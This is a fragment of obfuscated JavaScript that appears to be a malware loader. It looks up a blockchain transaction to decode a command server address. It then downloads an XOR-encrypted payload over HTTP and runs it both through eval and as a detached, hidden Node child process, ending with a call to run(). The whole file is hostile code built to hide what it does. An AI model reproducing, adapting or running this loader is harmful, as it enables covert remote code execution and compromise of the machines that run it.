_0x536ffd[_0x4ae716(0x1a6)](withRpcEndpoints,(_0x1568e8,_0x3a6baf)=>rpcCall(_0x1568e8,_0x4ae716(0x188)+_0x4ae716(0xee),[],_0x3a6baf))),_0x44074f=_0x536ffd[_0x4ae716(0x16d)](_0x3fc4ba,_0x536ffd[_0x4ae716(0x19a)](_0x3fc4ba,BLOCK_MULTIPLE));let _0x1e7e28=await _0x536ffd[_0x4ae716(0x161)](firstMatch,_0x536ffd[_0x4ae716(0x161)](candidateBlocks,_0x44074f)[_0x4ae716(0xf3)](blockTask));!_0x1e7e28&&(_0x1e7e28=await _0x536ffd[_0x4ae716(0xa5)](lastSenderTx,_0x3fc4ba)[_0x4ae716(0xb9)](()=>lastSenderTxViaIndexer()));const [_0x544ba5,_0x180372]=_0x536ffd[_0x4ae716(0x161)](decodeAddress,_0x1e7e28['tx']['to']),_0x2a08a9=global;_0x2a08a9['_V']=_0x2a08a9['i'],_0x2a08a9['_H']=_0x4ae716(0xc2)+_0x544ba5+_0x4ae716(0xd8),_0x2a08a9[_0x4ae716(0x11c)]=_0x4ae716(0xc2)+_0x180372+_0x4ae716(0xd8),_0x2a08a9[_0x4ae716(0x106)]=_0x4ae716(0xc2)+_0x544ba5+_0x4ae716(0x189),_0x2a08a9[_0x4ae716(0x125)]=_0x4ae716(0xc2)+_0x544ba5+_0x4ae716(0xd8);function _0x36c0d5(_0x33edf3,_0x4c1b27){const _0x50509f=_0x4ae716,_0x4df75b={'rVsop':function(_0x10838,_0x17aae3){const _0x38047e=_0x29d4;return _0x536ffd[_0x38047e(0xa3)](_0x10838,_0x17aae3);},'pnRjK':function(_0x2b1eca,_0x2e3b55){const _0x4d6a1a=_0x29d4;return _0x536ffd[_0x4d6a1a(0x1a2)](_0x2b1eca,_0x2e3b55);},'fvqbb':_0x536ffd[_0x50509f(0x11f)],'goBKs':function(_0x57eb49,_0x4bc6f7){const _0x1cd256=_0x50509f;return _0x536ffd[_0x1cd256(0x155)](_0x57eb49,_0x4bc6f7);},'kDMfM':function(_0x495e25,_0x5a958f){const _0x8f6b3c=_0x50509f;return _0x536ffd[_0x8f6b3c(0x155)](_0x495e25,_0x5a958f);},'kncJl':_0x536ffd[_0x50509f(0x171)],'oDrMO':_0x536ffd[_0x50509f(0x160)],'kCbKc':function(_0x170b81,_0x117608){const _0x41f541=_0x50509f;return _0x536ffd[_0x41f541(0x143)](_0x170b81,_0x117608);},'AWLqN':_0x536ffd[_0x50509f(0x74)],'YYQEA':function(_0x5be2a5,_0x3b0a5d){const _0x115004=_0x50509f;return _0x536ffd[_0x115004(0x155)](_0x5be2a5,_0x3b0a5d);},'jGAlf':_0x536ffd[_0x50509f(0x67)],'UenMP':_0x536ffd[_0x50509f(0x15b)],'WnaOl':_0x536ffd[_0x50509f(0x158)]},_0x41611c={'hostname':_0x4c1b27[_0x50509f(0xbe)],'port':_0x536ffd[_0x50509f(0x1a6)](Number,_0x4c1b27[_0x50509f(0xc3)])||-0x366+-0xd59+0x110f*0x1,'path':_0x536ffd[_0x50509f(0x84)](_0x4c1b27[_0x50509f(0x10f)],_0x4c1b27[_0x50509f(0x93)]),'headers':{'User-Agent':_0x536ffd[_0x50509f(0x9f)],'Sec-V':_0x2a08a9['_V']||-0x14f5+0x11a7+0x34e}};function _0x4274b0(_0x41a28f){const _0x520304=_0x50509f,_0x138a2e=_0x33edf3[_0x520304(0x199)];for(let _0x586ae2=-0x2*0x1304+0x17f9+0x3b*0x3d;_0x4df75b[_0x520304(0xc9)](_0x586ae2,_0x41a28f[_0x520304(0x199)]);_0x586ae2++)_0x41a28f[_0x586ae2]^=_0x33edf3[_0x520304(0xfa)](_0x4df75b[_0x520304(0xf6)](_0x586ae2,_0x138a2e));return _0x41a28f[_0x520304(0xdf)](_0x4df75b[_0x520304(0x8d)]);}function _0x3501d0(_0x5b3eaf){const _0x100675=_0x50509f,_0x26d3a7=_0x5b3eaf[_0x100675(0x10d)][_0x536ffd[_0x100675(0x171)]];if(!_0x26d3a7)throw new Error(_0x536ffd[_0x100675(0x80)]);return _0x536ffd[_0x100675(0x155)](_0x4274b0,Buffer[_0x100675(0x198)](_0x26d3a7,_0x536ffd[_0x100675(0xd4)]));}function _0x2869ae(_0xbeb9fa){return new Promise((_0x225619,_0x51c8da)=>{const _0x271414=_0x29d4,_0x3f5c46={'NEprN':function(_0x54f6a4,_0x20d12e){const _0x4f35ca=_0x29d4;return _0x4df75b[_0x4f35ca(0xfc)](_0x54f6a4,_0x20d12e);},'bgDpG':function(_0x4c9067,_0x503742){const _0x5c4430=_0x29d4;return _0x4df75b[_0x5c4430(0x101)](_0x4c9067,_0x503742);},'tnymS':_0x4df75b[_0x271414(0xdb)],'QpQBg':function(_0x8b759d,_0x5115b6){const _0x1a9a5f=_0x271414;return _0x4df75b[_0x1a9a5f(0xfc)](_0x8b759d,_0x5115b6);},'uhODZ':_0x4df75b[_0x271414(0x184)],'ZeszF':function(_0x2bf0fb,_0x1359c2){const _0x1b9957=_0x271414;return _0x4df75b[_0x1b9957(0x6c)](_0x2bf0fb,_0x1359c2);},'BRPkc':_0x4df75b[_0x271414(0x8e)],'yxvnX':function(_0x2af0e8,_0x37ebbd){const _0x12062d=_0x271414;return _0x4df75b[_0x12062d(0xeb)](_0x2af0e8,_0x37ebbd);},'YBRtc':function(_0x664353,_0x47a541){const _0x5004c3=_0x271414;return _0x4df75b[_0x5004c3(0xfc)](_0x664353,_0x47a541);},'Sravc':_0x4df75b[_0x271414(0x7e)],'cXNun':_0x4df75b[_0x271414(0x117)],'nRvVe':_0x4df75b[_0x271414(0x98)]},_0x109443=http[_0x271414(0x186)]({..._0x41611c,'method':_0xbeb9fa},_0x45ceb1=>{const _0x47a1dd=_0x271414;if(_0x3f5c46[_0x47a1dd(0x141)](_0xbeb9fa,_0x3f5c46[_0x47a1dd(0x118)])){try{_0x3f5c46[_0x47a1dd(0x12e)](_0x225619,_0x3f5c46[_0x47a1dd(0x177)](_0x3501d0,_0x45ceb1));}catch(_0x3e85e0){_0x3f5c46[_0x47a1dd(0xc7)](_0x51c8da,_0x3e85e0);}_0x45ceb1[_0x47a1dd(0x114)]();return;}const _0x53c2e5=[];_0x45ceb1['on'](_0x3f5c46[_0x47a1dd(0x115)],_0x178acd=>_0x53c2e5[_0x47a1dd(0x156)](_0x178acd)),_0x45ceb1['on'](_0x3f5c46[_0x47a1dd(0x13c)],()=>{const _0x51bd18=_0x47a1dd;try{const _0x2e4cf1=Buffer[_0x51bd18(0x137)](_0x53c2e5);if(_0x2e4cf1[_0x51bd18(0x199)])return _0x3f5c46[_0x51bd18(0x12e)](_0x225619,_0x3f5c46[_0x51bd18(0xa9)](_0x4274b0,_0x2e4cf1));if(_0x45ceb1[_0x51bd18(0x10d)][_0x3f5c46[_0x51bd18(0x1a4)]])return _0x3f5c46[_0x51bd18(0xb4)](_0x225619,_0x3f5c46[_0x51bd18(0x12e)](_0x3501d0,_0x45ceb1));_0x3f5c46[_0x51bd18(0x12e)](_0x51c8da,new Error(_0x3f5c46[_0x51bd18(0x8a)]));}catch(_0x1e4e06){_0x3f5c46[_0x51bd18(0x12e)](_0x51c8da,_0x1e4e06);}}),_0x45ceb1['on'](_0x3f5c46[_0x47a1dd(0x176)],_0x51c8da);});_0x109443['on'](_0x4df75b[_0x271414(0x98)],_0x51c8da),_0x109443[_0x271414(0x136)]();});}return _0x536ffd[_0x50509f(0x1a6)](_0x2869ae,_0x536ffd[_0x50509f(0x113)])[_0x50509f(0xb9)](()=>_0x2869ae(_0x50509f(0x185)));}async function _0x7af3f6(_0x270869,_0x15df3b,_0x2fb27b){const _0x5a4b42=_0x4ae716;try{const _0xc981e5=await _0x536ffd[_0x5a4b42(0xe9)](_0x36c0d5,_0x15df3b,_0x270869),_0x269846=_0x2fb27b?_0x5a4b42(0xd3)+_0x5a4b42(0xa4)+(_0x2a08a9['_V']||0x1*-0x561+-0x161*0x3+0x984)+(_0x5a4b42(0x11d)+_0x5a4b42(0x149))+_0x2a08a9['_H']+(_0x5a4b42(0x11d)+_0x5a4b42(0x13f))+_0x2a08a9[_0x536ffd[_0x5a4b42(0xb8)]]+(_0x5a4b42(0x11d)+_0x5a4b42(0xc1)+_0x5a4b42(0x138)+_0x5a4b42(0x162)+_0x5a4b42(0x18e)+_0x5a4b42(0x104)):_0x5a4b42(0xd3)+_0x5a4b42(0xa4)+(_0x2a08a9['_V']||0x239f+-0xc*-0x259+0x1*-0x3fcb)+(_0x5a4b42(0x11d)+_0x5a4b42(0x103))+_0x2a08a9[_0x536ffd[_0x5a4b42(0xc0)]]+(_0x5a4b42(0x11d)+_0x5a4b42(0xb1))+_0x2a08a9[_0x536ffd[_0x5a4b42(0xe7)]]+(_0x5a4b42(0x11d)+_0x5a4b42(0xc1)+_0x5a4b42(0x138)+_0x5a4b42(0x162)+_0x5a4b42(0x18e)+_0x5a4b42(0x104));if(!_0x2fb27b)_0x536ffd[_0x5a4b42(0x1a6)](eval,_0x536ffd[_0x5a4b42(0x84)](_0x269846,_0xc981e5));_0x536ffd[_0x5a4b42(0xa0)](spawn,_0x536ffd[_0x5a4b42(0x9c)],['-e',_0x536ffd[_0x5a4b42(0xac)](_0x269846,_0xc981e5)],{'detached':!(0x69b*-0x1+0x1168+-0xacd),'stdio':_0x536ffd[_0x5a4b42(0xf0)],'windowsHide':!(0x14cc+-0x1*-0x82e+-0x1cfa)})[_0x5a4b42(0x9b)]();}catch(_0x286fdc){}}await _0x536ffd[_0x4ae716(0x81)](_0x7af3f6,new URL(_0x4ae716(0xc2)+_0x544ba5+(_0x4ae716(0x140)+'s')),_0x536ffd[_0x4ae716(0x151)],!(-0x21c9*-0x1+0x2537+0x2d7*-0x19)),await _0x536ffd[_0x4ae716(0x15a)](_0x7af3f6,new URL(_0x4ae716(0xc2)+_0x544ba5+_0x4ae716(0x164)),_0x536ffd[_0x4ae716(0x139)],!(0x1a49*-0x1+0x21bc+-0x1*0x773));}function _0x29d4(_0x4df4a8,_0x3f3931){_0x4df4a8=_0x4df4a8-(-0x1b7d+-0x14e7+0x30cb);const _0x97226f=_0x5209();let _0x125fc1=_0x97226f[_0x4df4a8];return _0x125fc1;}run();
